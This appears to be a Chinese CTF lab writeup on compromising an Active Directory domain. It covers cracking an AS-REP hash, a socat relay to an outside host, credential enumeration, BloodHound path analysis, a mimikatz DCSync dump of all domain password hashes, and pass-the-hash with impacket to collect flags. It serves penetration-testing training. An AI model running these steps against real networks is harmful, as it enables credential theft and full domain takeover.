$krb5asrep$23$zhangxin@xiaorang.lab@XIAORANG.LAB:3cddf57b13cb1ea33850aaee7f312646$876281a694ed6d8250f3c296060b39bd78b7166efcf255dc660c5d6893c7624a31ca21d00e3a41a73f7a67eacaf54a6314e3d6ba126582d0fd62a113b80b4051ca29917e396203bde64563a51683847b3ffe7b2b419aef83ae27a131224bfdb289ec5ed9c763e61412ac68d58e2c9c4430f222bf0625afdf3424596aaa7f3e1aa8b1399f72718da049c0e6ca75286ef5a795793c5838762aae2e53c04fc196f64cfaecf4602b87a38bcd0737b6bff2af1660bc353888b07ce1351e8ee99c96c8ee6dd6dcf3cf5127f5265a62f1d91f82ffbdeeb91d21ffcb46e18054d98466702024d062fafe78bb8bb11b97
```
## 172.22.6.25
```bash
┌──(㉿kali)-[~/桌面]
└─$ hashcat hash.txt /usr/share/wordlists/rockyou.txt

$krb5asrep$23$zhangxin@xiaorang.lab@XIAORANG.LAB:3cddf57b13cb1ea33850aaee7f312646$876281a694ed6d8250f3c296060b39bd78b7166efcf255dc660c5d6893c7624a31ca21d00e3a41a73f7a67eacaf54a6314e3d6ba126582d0fd62a113b80b4051ca29917e396203bde64563a51683847b3ffe7b2b419aef83ae27a131224bfdb289ec5ed9c763e61412ac68d58e2c9c4430f222bf0625afdf3424596aaa7f3e1aa8b1399f72718da049c0e6ca75286ef5a795793c5838762aae2e53c04fc196f64cfaecf4602b87a38bcd0737b6bff2af1660bc353888b07ce1351e8ee99c96c8ee6dd6dcf3cf5127f5265a62f1d91f82ffbdeeb91d21ffcb46e18054d98466702024d062fafe78bb8bb11b97:strawberry
```
得到凭证zhaoxin:strawberry。用这个rdp登录172.22.6.25
本来想用kali上的rdesktop，但是不知道出于什么原因无法连接。
![](<assets/Pasted image 20250622204507.png>)
用proxifier曲线救国一下。注意连接时候的用户要用域用户`zhangxin@xiaorang.lab`。这台机器看上去也是不出网的。
### 端口转发上线
本来想试试vshell转发上线的，但是似乎并没有这个功能。于是传了个socat上去端口转发到上线地址。
`socat TCP-LISTEN:8084,fork TCP:156.238.233.9:8084 &` 
有一说一真是麻烦，不如cs一根。
![](<assets/Pasted image 20250622213409.png>)
传了个winpeas，枚举到凭证yuxuan/Yuxuan7QbrgZ3L。
### bloodhound收集信息
传一个sharphound上去收集一波。
![](<assets/Pasted image 20250622223641.png>)
需要十分注意的是，kali自带的bloodhound是4.3.1版本，又称legacy版，新版叫做bloodhound CE，要下载对应版本的sharphound。
![](<assets/Pasted image 20250622223954.png>)
可以看到从这台机器到域管理员需要通过一个HasSession和一个HasSIDHistory。中间的YUXUAN凭证我们已经拿到。这个用户滥用了SID历史功能(SIDHistory是一个为支持域迁移方案而设置的属性，当一个对象从一个域迁移到另一个域时，会在新域创建一个新的SID作为该对象的objectSid，在之前域中的SID会添加到该对象的sIDHistory属性中，此时该对象将保留在原来域的SID对应的访问权限)。所以可以利用**dcsync**。
### HasSIDHistroy打Dcsync
切换到用户YUXUAN再连接RDP
`mimikatz.exe "lsadump::dcsync /domain:xiaorang.lab /all /csv" exit`
```shell
C:\Users\yuxuan\Desktop>.\mimikatz.exe "lsadump::dcsync /domain:xiaorang.lab /all /csv" exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # lsadump::dcsync /domain:xiaorang.lab /all /csv
[DC] 'xiaorang.lab' will be the domain
[DC] 'DC-PROGAME.xiaorang.lab' will be the DC server
[DC] Exporting domain 'xiaorang.lab'
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
1103    shuzhen 07c1f387d7c2cf37e0ca7827393d2327        512
1104    gaiyong 52c909941c823dbe0f635b3711234d2e        512
1106    xiqidi  a55d27cfa25f3df92ad558c304292f2e        512
1107    wengbang        6b1d97a5a68c6c6c9233d11274d13a2e        512
1108    xuanjiang       a72a28c1a29ddf6509b8eabc61117c6c        512
1109    yuanchang       e1cea038f5c9ffd9dc323daf35f6843b        512
1110    lvhui   f58b31ef5da3fc831b4060552285ca54        512
1111    wenbo   9abb7115997ea03785e92542f684bdde        512
1112    zhenjun 94c84ba39c3ece24b419ab39fdd3de1a        512
1113    jinqing 4bf6ad7a2e9580bc8f19323f96749b3a        512
1115    yangju  1fa8c6b4307149415f5a1baffebe61cf        512
1117    weicheng        796a774eace67c159a65d6b86fea1d01        512
1118    weixian 8bd7dc83d84b3128bfbaf165bf292990        512
1119    haobei  045cc095cc91ba703c46aa9f9ce93df1        512
1120    jizhen  1840c5130e290816b55b4e5b60df10da        512
1121    jingze  3c8acaecc72f63a4be945ec6f4d6eeee        512
1122    rubao   d8bd6484a344214d7e0cfee0fa76df74        512
1123    zhaoxiu 694c5c0ec86269daefff4dd611305fab        512
1124    tangshun        90b8d8b2146db6456d92a4a133eae225        512
1125    liangliang      c67cd4bae75b82738e155df9dedab7c1        512
1126    qiyue   b723d29e23f00c42d97dd97cc6b04bc8        512
1127    chouqian        c6f0585b35de1862f324bc33c920328d        512
1128    jicheng 159ee55f1626f393de119946663a633c        512
1129    xiyi    ee146df96b366efaeb5138832a75603b        512
1130    beijin  a587b90ce9b675c9acf28826106d1d1d        512
1131    chenghui        08224236f9ddd68a51a794482b0e58b5        512
1132    chebin  b50adfe07d0cef27ddabd4276b3c3168        512
1133    pengyuan        a35d8f3c986ab37496896cbaa6cdfe3e        512
1134    yanglang        91c5550806405ee4d6f4521ba6e38f22        512
1135    jihuan  cbe4d79f6264b71a48946c3fa94443f5        512
1136    duanmuxiao      494cc0e2e20d934647b2395d0a102fb0        512
1137    hongzhi f815bf5a1a17878b1438773dba555b8b        512
1138    gaijin  b1040198d43631279a63b7fbc4c403af        512
1139    yifu    4836347be16e6af2cd746d3f934bb55a        512
1140    fusong  adca7ec7f6ab1d2c60eb60f7dca81be7        512
1141    luwan   c5b2b25ab76401f554f7e1e98d277a6a        512
1142    tangrong        2a38158c55abe6f6fe4b447fbc1a3e74        512
1143    zhufeng 71e03af8648921a3487a56e4bb8b5f53        512
1145    dongcheng       f2fdf39c9ff94e24cf185a00bf0a186d        512
1146    lianhuangchen   23dc8b3e465c94577aa8a11a83c001af        512
1147    lili    b290a36500f7e39beee8a29851a9f8d5        512
1148    huabi   02fe5838de111f9920e5e3bb7e009f2f        512
1149    rangsibo        103d0f70dc056939e431f9d2f604683c        512
1150    wohua   cfcc49ec89dd76ba87019ca26e5f7a50        512
1151    haoguang        33efa30e6b3261d30a71ce397c779fda        512
1152    langying        52a8a125cd369ab16a385f3fcadc757d        512
1153    diaocai a14954d5307d74cd75089514ccca097a        512
1154    lianggui        4ae2996c7c15449689280dfaec6f2c37        512
1155    manxue  0255c42d9f960475f5ad03e0fee88589        512
1156    baqin   327f2a711e582db21d9dd6d08f7bdf91        512
1157    chengqiu        0d0c1421edf07323c1eb4f5665b5cb6d        512
1158    louyou  a97ba112b411a3bfe140c941528a4648        512
1159    maqun   485c35105375e0754a852cee996ed33b        512
1160    wenbiao 36b6c466ea34b2c70500e0bfb98e68bc        512
1161    weishengshan    f60a4233d03a2b03a7f0ae619c732fae        512
1163    chuyuan 0cfdca5c210c918b11e96661de82948a        512
1164    wenliang        a4d2bacaf220292d5fdf9e89b3513a5c        512
1165    yulvxue cf970dea0689db62a43b272e2c99dccd        512
1166    luyue   274d823e941fc51f84ea323e22d5a8c4        512
1167    ganjian 7d3c39d94a272c6e1e2ffca927925ecc        512
1168    pangzhen        51d37e14983a43a6a45add0ae8939609        512
1169    guohong d3ce91810c1f004c782fe77c90f9deb6        512
1170    lezhong dad3990f640ccec92cf99f3b7be092c7        512
1171    sheweiyue       d17aecec7aa3a6f4a1e8d8b7c2163b35        512
1172    dujian  8f7846c78f03bf55685a697fe20b0857        512
1173    lidongjin       34638b8589d235dea49e2153ae89f2a1        512
1174    hongqun 6c791ef38d72505baeb4a391de05b6e1        512
1175    yexing  34842d36248c2492a5c9a1ae5d850d54        512
1176    maoda   6e65c0796f05c0118fbaa8d9f1309026        512
1177    qiaomei 6a889f350a0ebc15cf9306687da3fd34        512
502     krbtgt  a4206b127773884e2c7ea86cdd282d9c        514
1178    wenshao b31c6aa5660d6e87ee046b1bb5d0ff79        4260352
500     Administrator   04d93ffd6f5f6e4490e0de23f240a5e9        512
1000    DC-PROGAME$     8e58783ceda863e7be6f3df67cd33b1f        532480
1181    WIN2019$        2f259fdf8eaf801738b5f9ceed20df84        4096
1179    zhangxin        d6c5976e07cdb410be19b84126367e3d        4260352
1180    yuxuan  376ece347142d1628632d440530e8eed        66048

mimikatz(commandline) # exit
Bye!
```
拿到域管理员的hash之后直接随便横向
## 172.22.6.25&172.22.6.12
### pth
```powershell
┌──(㉿kali)-[~/桌面]
└─$ proxychains4 -q impacket-wmiexec XIAORANG/administrator@172.22.6.25 -hashes :04d93ffd6f5f6e4490e0de23f240a5e9
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>type C:\Users\Administrator\flag\flag*

C:\Users\Administrator\flag\flag03.txt


flag03: flag{81961a1c-c054-4a72-b449-29ffd267ab25}


Maybe you can find something interesting on this server. 
=======================================
What you may not know is that many objects in this domain 
are moved from other domains.
```
```powershell
┌──(㉿kali)-[~/桌面]
└─$ proxychains4 -q impacket-wmiexec XIAORANG/administrator@172.22.6.12 -hashes :04d93ffd6f5f6e4490e0de23f240a5e9
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>type C:\Users\Administrator\flag\flag*

C:\Users\Administrator\flag\flag04.txt


Awesome! you got the final flag.

::::::::::::::::::::::::::    :::: :::::::::: 
    :+:        :+:    +:+:+: :+:+:+:+:        
    +:+        +:+    +:+ +:+:+ +:++:+        
    +#+        +#+    +#+  +:+  +#++#++:++#   
    +#+        +#+    +#+       +#++#+        
    #+#        #+#    #+#       #+##+#        
    ###    ##############       ############# 


flag04: flag{a611f4e9-5e37-41cb-8590-c01371eaaa62}
```
![](<assets/Pasted image 20250622230135.png>)

这个环境似乎参考了htb的一台机器
> https://www.freebuf.com/articles/network/411124.html